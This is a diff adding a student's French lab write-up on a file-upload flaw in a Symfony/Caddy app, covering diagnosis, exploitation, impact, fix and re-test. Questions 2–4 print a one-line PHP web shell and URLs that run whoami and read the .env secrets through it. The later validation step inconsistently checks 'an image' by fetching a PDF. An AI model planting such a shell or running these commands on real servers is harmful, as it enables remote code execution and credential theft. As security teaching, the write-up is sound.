@@ -813,3 +813,175 @@ façon :
 - l'exo 10 c'est **à moi de décider** où et quoi compter, parce que Symfony sait pas ce qui
   mérite d'être limité dans mon appli. D'où les deux approches : dans le contrôleur pour une
   action précise, dans un listener pour une famille de routes.
+
+
+# Exercice 12.2 — Upload de fichier
+
+## Question 1 — Ce que le formulaire accepte vraiment
+
+Deux problèmes se répondent, un dans le formulaire, un dans le service qui enregistre.
+
+Dans `TopicType`, le champ `picture` est un simple `FileType` sans aucune contrainte :
+
+```php
+->add('picture', FileType::class, [
+    'label' => 'form.topic_picture_label',
+    'mapped' => false,
+    'required' => $options['isNew'],
+    ...
+])
+```
+
+Rien ne vérifie le type ni l'extension : côté serveur, n'importe quel fichier passe.
+
+Et dans `UploaderService`, le nom du fichier enregistré reprend l'extension **fournie par
+le client** :
+
+```php
+$filename = 'image-' . $count . '.' . $file->getClientOriginalExtension();
+$file->move($targetDir, $filename);
+```
+
+Le fichier atterrit dans `public/uploads/topic/`, et c'est Caddy qui le sert ensuite. Or le
+`Caddyfile` de départ passe tout à PHP :
+
+```
+root * /var/www/html/public
+file_server
+php_fastcgi php:9000
+```
+
+Donc tout `.php` déposé sous `public/` est exécuté.
+
+## Question 2 — Déposer un fichier qui n'est pas une image
+
+Je crée un `shell.php` :
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Je le joins au formulaire « Nouveau sujet » à la place de l'image. Comme il n'y a aucun
+contrôle, il est accepté et sauvé sous `public/uploads/topic/image-1.php`.
+
+## Question 3 — L'appeler
+
+```
+https://localhost:8443/uploads/topic/image-1.php?cmd=whoami
+```
+
+Le serveur me renvoie `appuser`. Le paramètre est `cmd` parce que c'est ce que lit mon code
+(`$_GET['cmd']`), pas `to`/`subject`/`body` — une URL ne « fait » que ce que le script lit.
+
+Pour le `.env` :
+
+```
+https://localhost:8443/uploads/topic/image-1.php?cmd=cat%20/var/www/html/.env
+```
+
+Et je récupère bien le contenu (APP_SECRET, identifiants de la base…).
+
+## Question 4 — Prouver l'exécution
+
+La requête exacte qui déclenche l'exécution :
+
+```
+GET https://localhost:8443/uploads/topic/image-1.php?cmd=whoami
+```
+
+La réponse `appuser` est une information que seul le serveur connaît : c'est la preuve que
+mon code s'exécute côté serveur (RCE).
+
+## Question 5 — L'impact
+
+Sous l'identité `appuser`, un attaquant peut :
+
+- lire tous les secrets (`.env` → APP_SECRET, identifiants MariaDB) ;
+- se connecter à la base avec ces identifiants et lire/modifier tout (comptes, hashs) ;
+- lire et écrire les fichiers du projet ;
+- exécuter des commandes arbitraires : poser une backdoor persistante, pivoter vers les
+  autres conteneurs (mariadb, mailpit).
+
+C'est une compromission totale de l'application.
+
+## Question 6 — Le correctif
+
+J'ai mis trois lignes de défense.
+
+**1. Filtrer ce qui entre** — une contrainte `Image` sur le champ `picture` dans
+`TopicType` :
+
+```php
+'constraints' => [
+    new Image(
+        maxSize: '2M',
+        mimeTypes: ['image/jpeg', 'image/png', 'image/webp', 'image/gif'],
+        mimeTypesMessage: 'Merci d\'envoyer une image valide (JPEG, PNG, WebP ou GIF).',
+    ),
+],
+```
+
+Un `.php` est maintenant refusé par le formulaire, même s'il se présente comme une image.
+
+**2. Ne plus subir l'extension du client** — dans `UploaderService`, l'extension est devinée
+à partir du contenu réel :
+
+```php
+$extension = $file->guessExtension() ?? 'bin';
+$filename = 'image-' . $count . '.' . $extension;
+```
+
+Un fichier PHP renommé n'obtiendra jamais une extension `.php` ici.
+
+**3. Empêcher l'exécution** — dans le `Caddyfile`, le dossier des uploads est servi en
+statique pur, jamais passé à PHP :
+
+```
+@uploads path /uploads/*
+handle @uploads {
+    file_server
+}
+
+handle {
+    php_fastcgi php:9000
+    file_server
+}
+```
+
+C'est la couche décisive : même un `.php` qui atterrirait là malgré tout serait renvoyé en
+texte brut.
+
+Le `Caddyfile` étant copié dans l'image (`COPY Caddyfile /etc/caddy/Caddyfile`), un
+`docker compose up -d --build caddy` est nécessaire pour que le changement soit pris.
+
+**Le rôle de l'exo 12.1** : `disable_functions` et `open_basedir` ne sont pas la protection
+principale mais des couches en plus. Si du PHP s'exécutait quand même, `disable_functions`
+(bloquant `system`, `shell_exec`…) ferait échouer `?cmd=whoami`, et `open_basedir`
+empêcherait de lire le `.env` hors du dossier autorisé. Ils réduisent l'impact ; ici c'est le
+`Caddyfile` qui coupe la racine du problème.
+
+## Question 7 — Revalider
+
+Je rejoue l'attaque après le rebuild de Caddy :
+
+```
+$ curl -sk "https://localhost:8443/uploads/topic/image-1.php?cmd=whoami"
+<?php system($_GET['cmd']); ?>
+```
+
+Le serveur renvoie le **code source** en texte brut au lieu de l'exécuter : plus de RCE.
+
+Une image légitime reste servie normalement :
+
+```
+$ curl -skI "https://localhost:8443/uploads/topic/image-1.pdf"
+HTTP/2 200
+content-type: application/pdf
+```
+
+## Ce que j'en retiens
+
+Une seule vérification ne suffit pas. Le vrai verrou n'est pas de deviner si un fichier est
+« méchant » à l'entrée, mais de faire en sorte que le dossier où atterrissent les uploads ne
+puisse jamais exécuter de code. Le filtrage à l'entrée sert à donner un message propre à
+l'utilisateur ; c'est la config du serveur qui protège vraiment.
